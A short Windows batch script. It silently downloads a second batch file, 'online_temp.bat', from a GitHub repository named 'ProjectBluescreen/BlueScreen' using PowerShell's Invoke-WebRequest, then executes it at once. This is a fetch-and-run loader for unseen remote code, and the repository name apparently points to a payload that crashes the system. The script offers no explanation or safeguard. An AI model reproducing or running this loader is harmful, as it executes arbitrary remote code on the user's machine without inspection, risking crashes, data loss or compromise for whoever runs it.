%echo off
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/online_temp.bat -OutFile online_temp.bat
online_temp.bat
